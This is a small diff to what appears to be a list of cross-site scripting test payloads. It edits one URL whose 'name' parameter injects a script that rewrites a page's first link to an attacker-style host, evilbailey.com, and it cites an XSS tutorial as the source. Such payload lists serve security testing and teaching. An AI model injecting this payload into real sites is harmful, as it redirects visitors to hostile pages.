@@ -1,4 +1,4 @@
-http://permalink.co/multivac/biteme.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://evilbailey.com/";}</script>
+http://permalink.co/multivac/biteme.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://www.evilbailey.com/";}</script>
 
 
 <!-- Source :  http://www.thegeekstuff.com/2012/02/xss-attack-examples/ -->
